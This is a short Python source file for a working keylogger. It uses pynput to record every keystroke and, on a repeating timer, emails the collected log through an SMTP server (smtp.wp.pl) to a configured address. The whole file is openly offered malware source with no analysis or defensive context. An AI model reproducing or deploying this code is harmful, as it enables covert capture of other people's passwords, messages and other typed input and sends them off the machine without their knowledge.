#!/usr/bin/env python


"""
Ver: Python3

Keylogger:
it records keys pressed on the keyboard and:
- stores logs locally
- reports logs to email
"""

import ssl, smtplib
from email.mime.text import MIMEText
import pynput.keyboard
import threading


class Keylogger:
    def __init__(self, time_interval, email, password, msg_subject):
        self.log = "Keylogger started."
        self.interval = time_interval
        self.email = email
        self.password = password
        self.msg_subject = msg_subject

    def append_to_log(self, string):
        self.log = self.log + string + " "

    def send_email(self, email, password, message_subject, message):
        port = 465
        smtp_server = "smtp.wp.pl"
        sender_email = email
        receiver_email = email

        msg = MIMEText(message)
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = message_subject

        # print(msg)
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, str(msg))

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(" Reporting " + self.log)
        self.send_email(self.email, self.password, self.msg_subject, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
